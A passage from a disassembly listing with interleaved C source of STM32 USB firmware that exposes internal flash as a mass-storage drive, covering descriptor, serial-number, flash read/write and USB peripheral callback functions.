 800c5ac:	af00      	add	r7, sp, #0
 800c5ae:	4603      	mov	r3, r0
 800c5b0:	6039      	str	r1, [r7, #0]
 800c5b2:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c5b4:	79fb      	ldrb	r3, [r7, #7]
 800c5b6:	2b00      	cmp	r3, #0
 800c5b8:	d105      	bne.n	800c5c6 <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c5ba:	683a      	ldr	r2, [r7, #0]
 800c5bc:	4907      	ldr	r1, [pc, #28]	; (800c5dc <USBD_FS_ConfigStrDescriptor+0x34>)
 800c5be:	4808      	ldr	r0, [pc, #32]	; (800c5e0 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c5c0:	f7ff fe1e 	bl	800c200 <USBD_GetString>
 800c5c4:	e004      	b.n	800c5d0 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c5c6:	683a      	ldr	r2, [r7, #0]
 800c5c8:	4904      	ldr	r1, [pc, #16]	; (800c5dc <USBD_FS_ConfigStrDescriptor+0x34>)
 800c5ca:	4805      	ldr	r0, [pc, #20]	; (800c5e0 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c5cc:	f7ff fe18 	bl	800c200 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c5d0:	4b02      	ldr	r3, [pc, #8]	; (800c5dc <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c5d2:	4618      	mov	r0, r3
 800c5d4:	3708      	adds	r7, #8
 800c5d6:	46bd      	mov	sp, r7
 800c5d8:	bd80      	pop	{r7, pc}
 800c5da:	bf00      	nop
 800c5dc:	2000097c 	.word	0x2000097c
 800c5e0:	0800d25c 	.word	0x0800d25c

0800c5e4 <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c5e4:	b580      	push	{r7, lr}
 800c5e6:	b082      	sub	sp, #8
 800c5e8:	af00      	add	r7, sp, #0
 800c5ea:	4603      	mov	r3, r0
 800c5ec:	6039      	str	r1, [r7, #0]
 800c5ee:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c5f0:	79fb      	ldrb	r3, [r7, #7]
 800c5f2:	2b00      	cmp	r3, #0
 800c5f4:	d105      	bne.n	800c602 <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c5f6:	683a      	ldr	r2, [r7, #0]
 800c5f8:	4907      	ldr	r1, [pc, #28]	; (800c618 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c5fa:	4808      	ldr	r0, [pc, #32]	; (800c61c <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c5fc:	f7ff fe00 	bl	800c200 <USBD_GetString>
 800c600:	e004      	b.n	800c60c <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c602:	683a      	ldr	r2, [r7, #0]
 800c604:	4904      	ldr	r1, [pc, #16]	; (800c618 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c606:	4805      	ldr	r0, [pc, #20]	; (800c61c <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c608:	f7ff fdfa 	bl	800c200 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c60c:	4b02      	ldr	r3, [pc, #8]	; (800c618 <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c60e:	4618      	mov	r0, r3
 800c610:	3708      	adds	r7, #8
 800c612:	46bd      	mov	sp, r7
 800c614:	bd80      	pop	{r7, pc}
 800c616:	bf00      	nop
 800c618:	2000097c 	.word	0x2000097c
 800c61c:	0800d268 	.word	0x0800d268

0800c620 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c620:	b480      	push	{r7}
 800c622:	b083      	sub	sp, #12
 800c624:	af00      	add	r7, sp, #0
 800c626:	4603      	mov	r3, r0
 800c628:	6039      	str	r1, [r7, #0]
 800c62a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c62c:	683b      	ldr	r3, [r7, #0]
 800c62e:	220c      	movs	r2, #12
 800c630:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c632:	4b03      	ldr	r3, [pc, #12]	; (800c640 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c634:	4618      	mov	r0, r3
 800c636:	370c      	adds	r7, #12
 800c638:	46bd      	mov	sp, r7
 800c63a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c63e:	4770      	bx	lr
 800c640:	200001f4 	.word	0x200001f4

0800c644 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c644:	b580      	push	{r7, lr}
 800c646:	b084      	sub	sp, #16
 800c648:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c64a:	4b0f      	ldr	r3, [pc, #60]	; (800c688 <Get_SerialNum+0x44>)
 800c64c:	681b      	ldr	r3, [r3, #0]
 800c64e:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c650:	4b0e      	ldr	r3, [pc, #56]	; (800c68c <Get_SerialNum+0x48>)
 800c652:	681b      	ldr	r3, [r3, #0]
 800c654:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c656:	4b0e      	ldr	r3, [pc, #56]	; (800c690 <Get_SerialNum+0x4c>)
 800c658:	681b      	ldr	r3, [r3, #0]
 800c65a:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c65c:	68fa      	ldr	r2, [r7, #12]
 800c65e:	687b      	ldr	r3, [r7, #4]
 800c660:	4413      	add	r3, r2
 800c662:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c664:	68fb      	ldr	r3, [r7, #12]
 800c666:	2b00      	cmp	r3, #0
 800c668:	d009      	beq.n	800c67e <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c66a:	2208      	movs	r2, #8
 800c66c:	4909      	ldr	r1, [pc, #36]	; (800c694 <Get_SerialNum+0x50>)
 800c66e:	68f8      	ldr	r0, [r7, #12]
 800c670:	f000 f814 	bl	800c69c <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c674:	2204      	movs	r2, #4
 800c676:	4908      	ldr	r1, [pc, #32]	; (800c698 <Get_SerialNum+0x54>)
 800c678:	68b8      	ldr	r0, [r7, #8]
 800c67a:	f000 f80f 	bl	800c69c <IntToUnicode>
  }
}
 800c67e:	bf00      	nop
 800c680:	3710      	adds	r7, #16
 800c682:	46bd      	mov	sp, r7
 800c684:	bd80      	pop	{r7, pc}
 800c686:	bf00      	nop
 800c688:	1fff7590 	.word	0x1fff7590
 800c68c:	1fff7594 	.word	0x1fff7594
 800c690:	1fff7598 	.word	0x1fff7598
 800c694:	20000206 	.word	0x20000206
 800c698:	20000216 	.word	0x20000216

0800c69c <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c69c:	b480      	push	{r7}
 800c69e:	b087      	sub	sp, #28
 800c6a0:	af00      	add	r7, sp, #0
 800c6a2:	60f8      	str	r0, [r7, #12]
 800c6a4:	60b9      	str	r1, [r7, #8]
 800c6a6:	4613      	mov	r3, r2
 800c6a8:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c6aa:	2300      	movs	r3, #0
 800c6ac:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c6ae:	2300      	movs	r3, #0
 800c6b0:	75fb      	strb	r3, [r7, #23]
 800c6b2:	e027      	b.n	800c704 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c6b4:	68fb      	ldr	r3, [r7, #12]
 800c6b6:	0f1b      	lsrs	r3, r3, #28
 800c6b8:	2b09      	cmp	r3, #9
 800c6ba:	d80b      	bhi.n	800c6d4 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c6bc:	68fb      	ldr	r3, [r7, #12]
 800c6be:	0f1b      	lsrs	r3, r3, #28
 800c6c0:	b2da      	uxtb	r2, r3
 800c6c2:	7dfb      	ldrb	r3, [r7, #23]
 800c6c4:	005b      	lsls	r3, r3, #1
 800c6c6:	4619      	mov	r1, r3
 800c6c8:	68bb      	ldr	r3, [r7, #8]
 800c6ca:	440b      	add	r3, r1
 800c6cc:	3230      	adds	r2, #48	; 0x30
 800c6ce:	b2d2      	uxtb	r2, r2
 800c6d0:	701a      	strb	r2, [r3, #0]
 800c6d2:	e00a      	b.n	800c6ea <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c6d4:	68fb      	ldr	r3, [r7, #12]
 800c6d6:	0f1b      	lsrs	r3, r3, #28
 800c6d8:	b2da      	uxtb	r2, r3
 800c6da:	7dfb      	ldrb	r3, [r7, #23]
 800c6dc:	005b      	lsls	r3, r3, #1
 800c6de:	4619      	mov	r1, r3
 800c6e0:	68bb      	ldr	r3, [r7, #8]
 800c6e2:	440b      	add	r3, r1
 800c6e4:	3237      	adds	r2, #55	; 0x37
 800c6e6:	b2d2      	uxtb	r2, r2
 800c6e8:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c6ea:	68fb      	ldr	r3, [r7, #12]
 800c6ec:	011b      	lsls	r3, r3, #4
 800c6ee:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c6f0:	7dfb      	ldrb	r3, [r7, #23]
 800c6f2:	005b      	lsls	r3, r3, #1
 800c6f4:	3301      	adds	r3, #1
 800c6f6:	68ba      	ldr	r2, [r7, #8]
 800c6f8:	4413      	add	r3, r2
 800c6fa:	2200      	movs	r2, #0
 800c6fc:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c6fe:	7dfb      	ldrb	r3, [r7, #23]
 800c700:	3301      	adds	r3, #1
 800c702:	75fb      	strb	r3, [r7, #23]
 800c704:	7dfa      	ldrb	r2, [r7, #23]
 800c706:	79fb      	ldrb	r3, [r7, #7]
 800c708:	429a      	cmp	r2, r3
 800c70a:	d3d3      	bcc.n	800c6b4 <IntToUnicode+0x18>
  }
}
 800c70c:	bf00      	nop
 800c70e:	bf00      	nop
 800c710:	371c      	adds	r7, #28
 800c712:	46bd      	mov	sp, r7
 800c714:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c718:	4770      	bx	lr

0800c71a <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c71a:	b480      	push	{r7}
 800c71c:	b083      	sub	sp, #12
 800c71e:	af00      	add	r7, sp, #0
 800c720:	4603      	mov	r3, r0
 800c722:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c724:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c726:	4618      	mov	r0, r3
 800c728:	370c      	adds	r7, #12
 800c72a:	46bd      	mov	sp, r7
 800c72c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c730:	4770      	bx	lr

0800c732 <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c732:	b480      	push	{r7}
 800c734:	b085      	sub	sp, #20
 800c736:	af00      	add	r7, sp, #0
 800c738:	4603      	mov	r3, r0
 800c73a:	60b9      	str	r1, [r7, #8]
 800c73c:	607a      	str	r2, [r7, #4]
 800c73e:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c740:	68bb      	ldr	r3, [r7, #8]
 800c742:	2240      	movs	r2, #64	; 0x40
 800c744:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c746:	687b      	ldr	r3, [r7, #4]
 800c748:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c74c:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c74e:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c750:	4618      	mov	r0, r3
 800c752:	3714      	adds	r7, #20
 800c754:	46bd      	mov	sp, r7
 800c756:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c75a:	4770      	bx	lr

0800c75c <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c75c:	b480      	push	{r7}
 800c75e:	b083      	sub	sp, #12
 800c760:	af00      	add	r7, sp, #0
 800c762:	4603      	mov	r3, r0
 800c764:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c766:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c768:	4618      	mov	r0, r3
 800c76a:	370c      	adds	r7, #12
 800c76c:	46bd      	mov	sp, r7
 800c76e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c772:	4770      	bx	lr

0800c774 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c774:	b480      	push	{r7}
 800c776:	b083      	sub	sp, #12
 800c778:	af00      	add	r7, sp, #0
 800c77a:	4603      	mov	r3, r0
 800c77c:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c77e:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c780:	4618      	mov	r0, r3
 800c782:	370c      	adds	r7, #12
 800c784:	46bd      	mov	sp, r7
 800c786:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c78a:	4770      	bx	lr

0800c78c <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c78c:	b580      	push	{r7, lr}
 800c78e:	b084      	sub	sp, #16
 800c790:	af00      	add	r7, sp, #0
 800c792:	60b9      	str	r1, [r7, #8]
 800c794:	607a      	str	r2, [r7, #4]
 800c796:	461a      	mov	r2, r3
 800c798:	4603      	mov	r3, r0
 800c79a:	73fb      	strb	r3, [r7, #15]
 800c79c:	4613      	mov	r3, r2
 800c79e:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c7a0:	7bfb      	ldrb	r3, [r7, #15]
 800c7a2:	2b00      	cmp	r3, #0
 800c7a4:	d10d      	bne.n	800c7c2 <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c7a6:	687b      	ldr	r3, [r7, #4]
 800c7a8:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c7ac:	3340      	adds	r3, #64	; 0x40
 800c7ae:	02db      	lsls	r3, r3, #11
 800c7b0:	4619      	mov	r1, r3
 800c7b2:	89bb      	ldrh	r3, [r7, #12]
 800c7b4:	02db      	lsls	r3, r3, #11
 800c7b6:	461a      	mov	r2, r3
 800c7b8:	68b8      	ldr	r0, [r7, #8]
 800c7ba:	f000 fc65 	bl	800d088 <memcpy>
		return (USBD_OK);
 800c7be:	2300      	movs	r3, #0
 800c7c0:	e000      	b.n	800c7c4 <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c7c2:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c7c4:	4618      	mov	r0, r3
 800c7c6:	3710      	adds	r7, #16
 800c7c8:	46bd      	mov	sp, r7
 800c7ca:	bd80      	pop	{r7, pc}

0800c7cc <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c7cc:	b580      	push	{r7, lr}
 800c7ce:	b08a      	sub	sp, #40	; 0x28
 800c7d0:	af00      	add	r7, sp, #0
 800c7d2:	60b9      	str	r1, [r7, #8]
 800c7d4:	607a      	str	r2, [r7, #4]
 800c7d6:	461a      	mov	r2, r3
 800c7d8:	4603      	mov	r3, r0
 800c7da:	73fb      	strb	r3, [r7, #15]
 800c7dc:	4613      	mov	r3, r2
 800c7de:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c7e0:	7bfb      	ldrb	r3, [r7, #15]
 800c7e2:	2b00      	cmp	r3, #0
 800c7e4:	d136      	bne.n	800c854 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c7e6:	f7f4 febb 	bl	8001560 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c7ea:	2300      	movs	r3, #0
 800c7ec:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c7ee:	2301      	movs	r3, #1
 800c7f0:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c7f2:	687b      	ldr	r3, [r7, #4]
 800c7f4:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c7f8:	3340      	adds	r3, #64	; 0x40
 800c7fa:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c7fe:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c800:	89bb      	ldrh	r3, [r7, #12]
 800c802:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c804:	2300      	movs	r3, #0
 800c806:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c808:	f107 0210 	add.w	r2, r7, #16
 800c80c:	f107 0314 	add.w	r3, r7, #20
 800c810:	4611      	mov	r1, r2
 800c812:	4618      	mov	r0, r3
 800c814:	f7f4 ff8a 	bl	800172c <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c818:	2300      	movs	r3, #0
 800c81a:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c81c:	e011      	b.n	800c842 <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c81e:	687b      	ldr	r3, [r7, #4]
 800c820:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c824:	3340      	adds	r3, #64	; 0x40
 800c826:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c828:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c82a:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c82c:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c82e:	68ba      	ldr	r2, [r7, #8]
 800c830:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c832:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c836:	2000      	movs	r0, #0
 800c838:	f7f4 fe26 	bl	8001488 <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c83c:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c83e:	3308      	adds	r3, #8
 800c840:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c842:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c844:	89bb      	ldrh	r3, [r7, #12]
 800c846:	02db      	lsls	r3, r3, #11
 800c848:	429a      	cmp	r2, r3
 800c84a:	d3e8      	bcc.n	800c81e <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c84c:	f7f4 feaa 	bl	80015a4 <HAL_FLASH_Lock>
		return USBD_OK;
 800c850:	2300      	movs	r3, #0
 800c852:	e000      	b.n	800c856 <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c854:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c856:	4618      	mov	r0, r3
 800c858:	3728      	adds	r7, #40	; 0x28
 800c85a:	46bd      	mov	sp, r7
 800c85c:	bd80      	pop	{r7, pc}

0800c85e <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c85e:	b480      	push	{r7}
 800c860:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800c862:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c864:	4618      	mov	r0, r3
 800c866:	46bd      	mov	sp, r7
 800c868:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c86c:	4770      	bx	lr
	...

0800c870 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c870:	b580      	push	{r7, lr}
 800c872:	b098      	sub	sp, #96	; 0x60
 800c874:	af00      	add	r7, sp, #0
 800c876:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c878:	f107 030c 	add.w	r3, r7, #12
 800c87c:	2254      	movs	r2, #84	; 0x54
 800c87e:	2100      	movs	r1, #0
 800c880:	4618      	mov	r0, r3
 800c882:	f000 fbd5 	bl	800d030 <memset>
  if(pcdHandle->Instance==USB)
 800c886:	687b      	ldr	r3, [r7, #4]
 800c888:	681b      	ldr	r3, [r3, #0]
 800c88a:	4a1d      	ldr	r2, [pc, #116]	; (800c900 <HAL_PCD_MspInit+0x90>)
 800c88c:	4293      	cmp	r3, r2
 800c88e:	d132      	bne.n	800c8f6 <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800c890:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800c894:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800c896:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800c89a:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800c89c:	2301      	movs	r3, #1
 800c89e:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800c8a0:	2301      	movs	r3, #1
 800c8a2:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800c8a4:	2318      	movs	r3, #24
 800c8a6:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800c8a8:	2307      	movs	r3, #7
 800c8aa:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800c8ac:	2302      	movs	r3, #2
 800c8ae:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800c8b0:	2302      	movs	r3, #2
 800c8b2:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800c8b4:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800c8b8:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800c8ba:	f107 030c 	add.w	r3, r7, #12
 800c8be:	4618      	mov	r0, r3
 800c8c0:	f7f7 fe5c 	bl	800457c <HAL_RCCEx_PeriphCLKConfig>
 800c8c4:	4603      	mov	r3, r0
 800c8c6:	2b00      	cmp	r3, #0
 800c8c8:	d001      	beq.n	800c8ce <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800c8ca:	f7f4 fa03 	bl	8000cd4 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800c8ce:	4b0d      	ldr	r3, [pc, #52]	; (800c904 <HAL_PCD_MspInit+0x94>)
 800c8d0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c8d2:	4a0c      	ldr	r2, [pc, #48]	; (800c904 <HAL_PCD_MspInit+0x94>)
 800c8d4:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800c8d8:	6593      	str	r3, [r2, #88]	; 0x58
 800c8da:	4b0a      	ldr	r3, [pc, #40]	; (800c904 <HAL_PCD_MspInit+0x94>)
 800c8dc:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c8de:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800c8e2:	60bb      	str	r3, [r7, #8]
 800c8e4:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800c8e6:	2200      	movs	r2, #0
 800c8e8:	2100      	movs	r1, #0
 800c8ea:	2043      	movs	r0, #67	; 0x43
 800c8ec:	f7f4 fd95 	bl	800141a <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800c8f0:	2043      	movs	r0, #67	; 0x43
 800c8f2:	f7f4 fdae 	bl	8001452 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800c8f6:	bf00      	nop
 800c8f8:	3760      	adds	r7, #96	; 0x60
 800c8fa:	46bd      	mov	sp, r7
 800c8fc:	bd80      	pop	{r7, pc}
 800c8fe:	bf00      	nop
 800c900:	40006800 	.word	0x40006800
 800c904:	40021000 	.word	0x40021000

0800c908 <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c908:	b580      	push	{r7, lr}
 800c90a:	b082      	sub	sp, #8
 800c90c:	af00      	add	r7, sp, #0
 800c90e:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800c910:	687b      	ldr	r3, [r7, #4]
 800c912:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800c916:	687b      	ldr	r3, [r7, #4]
 800c918:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800c91c:	4619      	mov	r1, r3
 800c91e:	4610      	mov	r0, r2
 800c920:	f7fe fb70 	bl	800b004 <USBD_LL_SetupStage>
}
 800c924:	bf00      	nop
 800c926:	3708      	adds	r7, #8
 800c928:	46bd      	mov	sp, r7
 800c92a:	bd80      	pop	{r7, pc}

0800c92c <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c92c:	b580      	push	{r7, lr}
 800c92e:	b082      	sub	sp, #8
 800c930:	af00      	add	r7, sp, #0
 800c932:	6078      	str	r0, [r7, #4]
 800c934:	460b      	mov	r3, r1
 800c936:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800c938:	687b      	ldr	r3, [r7, #4]
 800c93a:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c93e:	78fa      	ldrb	r2, [r7, #3]
 800c940:	6879      	ldr	r1, [r7, #4]
 800c942:	4613      	mov	r3, r2
 800c944:	009b      	lsls	r3, r3, #2
 800c946:	4413      	add	r3, r2
 800c948:	00db      	lsls	r3, r3, #3
 800c94a:	440b      	add	r3, r1
